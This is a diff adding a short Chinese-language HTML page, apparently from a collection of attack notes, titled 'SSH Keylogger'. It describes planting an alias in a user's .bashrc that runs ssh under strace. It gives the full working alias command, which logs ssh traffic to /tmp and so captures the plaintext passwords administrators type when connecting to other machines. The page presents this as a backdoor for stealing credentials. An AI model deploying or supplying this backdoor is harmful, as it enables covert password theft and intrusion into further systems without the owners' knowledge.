@@ -1,0 +1,20 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="ssh-keylogger"><span class="csDE05BCC">SSH Keylogger</span></a></h1>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">利用</span><span class="cs8926E06">strace</span><span class="cs9C1B1871">系统调试工具获取</span><span class="cs8926E06">ssh</span><span class="cs9C1B1871">的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在当前用户的</span><span class="cs8926E06">.bashrc</span><span class="cs9C1B1871">里新建一条</span><span class="cs8926E06">alias</span><span class="cs9C1B1871">、这样可以抓取他登陆其他机器的</span><span class="cs8926E06">ssh</span><span class="cs9C1B1871">密码。算是</span><span class="cs8926E06">alias</span><span class="cs9C1B1871">后门。后面会在讲一下</span><span class="cs8926E06">alias</span><span class="cs9C1B1871">后门。</span></p><p class="cs3A447A38"><span class="cs9FB05234">alias ssh=&#39;strace -o /tmp/sshpwd-`date &#39;+%d%h%m%s&#39;`.log -e read,write,connect -s2048 ssh&#39;</span></p><p class="cs40DD2BC9"><span><img src="安全技术/Linux后门/SSH后门/SSH%20Keylogger%20_files/image0.png" width="560" height="193" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">&nbsp;</span></p></body>
+</html>
